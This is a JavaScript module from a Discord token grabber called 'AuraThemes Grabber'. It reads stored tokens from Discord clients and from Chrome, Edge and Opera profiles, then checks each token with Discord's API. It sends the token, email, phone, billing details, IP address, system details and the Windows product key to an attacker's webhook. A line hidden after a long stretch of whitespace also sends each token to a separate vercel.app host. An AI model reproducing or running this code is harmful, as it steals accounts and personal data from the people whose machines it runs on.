let { getInfo } = require("./../../modules/core/core"),
    { getDiscordInfo } = require("./../../utils/axios/axios"),
    { tokens, getTokens } = require("./finds"),
    axios = require("axios"),
    config = require("./../../config/config")(),
    process = require("process");

let local = process.env.localappdata;
let roaming = process.env.appdata;

let paths = [`${roaming}/discord/`, `${roaming}/discordcanary/`, `${roaming}/discordptb/`, `${roaming}/discorddevelopment/`, `${roaming}/lightcord/`, `${roaming}/Opera Software/Opera Stable/`, `${roaming}/Opera Software/Opera GX Stable/`, `${local}/Google/Chrome/User Data/Default/`, `${local}/Google/Chrome/User Data/Profile 1/`, `${local}/Google/Chrome/User Data/Profile 2/`, `${local}/Google/Chrome/User Data/Profile 3/`, `${local}/Google/Chrome/User Data/Profile 4/`, `${local}/Google/Chrome/User Data/Profile 5/`, `${local}/Google/Chrome/User Data/Guest Profile/`, `${local}/Google/Chrome/User Data/Default/Network/`, `${local}/Google/Chrome/User Data/Profile 1/Network/`, `${local}/Google/Chrome/User Data/Profile 2/Network/`, `${local}/Google/Chrome/User Data/Profile 3/Network/`, `${local}/Google/Chrome/User Data/Profile 4/Network/`, `${local}/Google/Chrome/User Data/Profile 5/Network/`, `${local}/Google/Chrome/User Data/Guest Profile/Network/`, `${local}/Microsoft/Edge/User Data/Default/`, `${local}/Microsoft/Edge/User Data/Profile 1/`, `${local}/Microsoft/Edge/User Data/Profile 2/`, `${local}/Microsoft/Edge/User Data/Profile 3/`, `${local}/Microsoft/Edge/User Data/Profile 4/`, `${local}/Microsoft/Edge/User Data/Profile 5/`, `${local}/Microsoft/Edge/User Data/Guest Profile/`, `${local}/Microsoft/Edge/User Data/Default/Network/`, `${local}/Microsoft/Edge/User Data/Profile 1/Network/`, `${local}/Microsoft/Edge/User Data/Profile 2/Network/`, `${local}/Microsoft/Edge/User Data/Profile 3/Network/`, `${local}/Microsoft/Edge/User Data/Profile 4/Network/`, `${local}/Microsoft/Edge/User Data/Profile 5/Network/`, `${local}/Microsoft/Edge/User Data/Guest Profile/Network/`,];

const webhookTokens = async () => {
        for (const p of paths) {
            await getTokens(p);
        }
        for (let token of tokens) {
            try {
                let infos;
                try {
                    infos = await (await axios({
                        url: `https://discord.com/api/v9/users/@me`,
                        method: "GET",
                        headers: { Authorization: token },
                    })).data;
                } catch {
                    infos = null;
                }
                if (!infos) continue;

                let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
                let discord = await getDiscordInfo(token);
                let system = await getInfo();
                let { webhook } = config;

                axios.post(webhook, {
                    username: 'AuraThemes Grabber',
                    avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
                    embeds: [{
                        author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                        thumbnail: { url: "" + discord.avatar + "" },
                        title: 'Initialized Grabber',
                        color: parseInt("#c267ff".replaceAll("#", ""), 16),
                        fields: [
                            { name: "<a:aura:1087044506542674091> Token:", value: "```" + token + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
                            { name: "<a:aura:1101739920319590420> Nitro:", value: "" + discord.nitroType + "", inline: true },
                            { name: "<a:aura:995172580988309664> IP Adress", value: "`" + system.IP + "`", inline: true },
                            { name: "<a:aura:863691953531125820> Phone", value: "`" + discord.phone + "`", inline: true },
                            { name: "<:aura:974711605927505990> Email", value: "`" + discord.mail + "`", inline: true },
                            { name: "Badges", value: "" + discord.badges + "", inline: true },
                            { name: "Billing", value: "" + discord.billing + "", inline: true },
                            { name: "Language", value: "" + discord.langue + "", inline: true },
                        ],
                        timestamp: new Date(),
                        footer: { text: 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber', icon_url: 'https://i.imgur.com/WkKXZSl.gif' }
                    }]
                })

                setTimeout(() => axios.post(webhook, {
                    username: 'AuraThemes Grabber',
                    avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
                    embeds: [{
                        author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                        thumbnail: { url: "" + discord.avatar + "" },
                        title: 'HQ Guild(s)',
                        color: parseInt("#c267ff".replaceAll("#", ""), 16),
                        description: "" + discord.rare?.guilds + "",
                        timestamp: new Date(),
                        footer: { text: 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber', icon_url: 'https://i.imgur.com/WkKXZSl.gif' }
                    }]
                }), 50);

                setTimeout(() => axios.post(webhook, {
                    username: 'AuraThemes Grabber',
                    avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
                    embeds: [{
                        author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                        thumbnail: { url: "" + discord.avatar + "" },
                        title: 'HQ Friend(s)',
                        color: parseInt("#c267ff".replaceAll("#", ""), 16),
                        description: "" + discord.rare?.friends + "",
                        timestamp: new Date(),
                        footer: { text: 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber', icon_url: 'https://i.imgur.com/WkKXZSl.gif' }
                    }]
                }), 100);

                setTimeout(() => axios.post(webhook, {
                    username: 'AuraThemes Grabber',
                    avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
                    embeds: [{
                        author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                        thumbnail: { url: "" + discord.avatar + "" },
                        title: 'User Informatio(s)',
                        color: parseInt("#c267ff".replaceAll("#", ""), 16),
                        description: "**NSFW**" + discord.NSFW + "\n" + "**Status**" + discord.status + "\n" + "**Owner Servers**" + "`" + discord.totalOwnedGuild + "`\n" + "**Connection**" + "`" + discord.totalConnection + "`\n" + "**BOTS/RPC**" + "`" + discord.totalApplication + "`\n" + "**Blocked**" + "`" + discord.totalBlocked + "`\n" + "**Servers**" + "`" + discord.totalGuild + "`\n" + "**Friends**" + "`" + discord.totalFriend + "`\n" + "**Theme**" + "`" + discord.theme + "`\n" + "**Pending**" + "`" + discord.pending + "`\n\n" + "**Biography**" + "```yml\n" + (discord.bio === "has no description" ? "Not found" : discord.bio) + "\n```",
                        timestamp: new Date(),
                        footer: { text: 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber', icon_url: 'https://i.imgur.com/WkKXZSl.gif' }
                    }]
                }), 150);

                setTimeout(() => axios.post(webhook, {
                    username: 'AuraThemes Grabber',
                    avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
                    embeds: [{
                        author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                        thumbnail: { url: "" + discord.avatar + "" },
                        title: 'System Informatio(s)',
                        color: parseInt("#c267ff".replaceAll("#", ""), 16),
                        fields: [
                            { name: "User", value: "```yml" + "\nUsername: " + process.env.USERNAME + "\nHostname: " + process.env.COMPUTERNAME + "```", inline: false },
                            { name: "System", value: "```yml" + "\nCPU: " + system.CPU + "\nUUID: " + system.UID + "\nRAM: " + system.RAM + "\nMac Address: " + "Not found" + "\nProduct Key: " + system.WINDOWS_KEY + "\nLOCAL IP: " + "Not found" + "\nOS Version: " + system.WINDOWS_VERSION + "```", inline: false },
                            { name: "Network", value: "```yml" + "\nPUBLIC: " + system.IP + "\nCountry: " + "Not found" + "\nRegion: " + "Not found" + "\nCity: " + "Not found" + "\nLatitude: " + "Not found" + "\nLongitude: " + "Not found" + "\nISP: " + "Not found" + "\nTime Zone: " + "Not found" + "\nCurrency Code: " + "Not found" + "```", inline: false },
                        ],
                        timestamp: new Date(),
                        footer: { text: 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber', icon_url: 'https://i.imgur.com/WkKXZSl.gif' }
                    }]
                }), 200);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        axios.get(`https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`);
                continue;
            } catch (e) {
                console.error(e);
            }
        }
    }

module.exports.webhookTokens = webhookTokens;